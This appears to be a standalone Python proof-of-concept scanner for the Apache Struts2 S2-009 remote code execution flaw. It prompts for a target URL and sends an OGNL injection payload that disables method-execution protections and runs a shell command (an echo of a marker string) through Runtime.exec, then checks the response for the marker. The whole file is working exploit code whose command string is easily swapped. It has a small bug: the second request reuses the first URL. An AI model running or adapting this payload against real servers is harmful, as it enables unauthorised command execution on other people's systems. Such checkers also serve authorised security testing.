import re
import requests
import urllib


def s2_009(url):
    relsult = {
        'name': 'S2-009 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    hash_flag = 's3uih34saj1kd7827hzf'
    payload = r'/ajax/example5?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo%20s3uih34saj1kd7827hzf%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
    payload2 = r'/ajax/example5?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22s3uih34saj1kd7827hzf%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
    vulurl = urllib.parse.urljoin(url, payload)
    vulurl2 = urllib.parse.urljoin(url, payload2)
    try:
        req = requests.get(vulurl, timeout=3)
        req2 = requests.get(vulurl, timeout=3)
        if re.search(hash_flag, req.text):
            if re.search(hash_flag, req2.text) and len(req2.text) < len(req.text):
                pass
            else:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vulurl
        return relsult
    except:
        return relsult



if __name__ == '__main__':
    url = input('输入目标URL:')
    print(s2_009(url))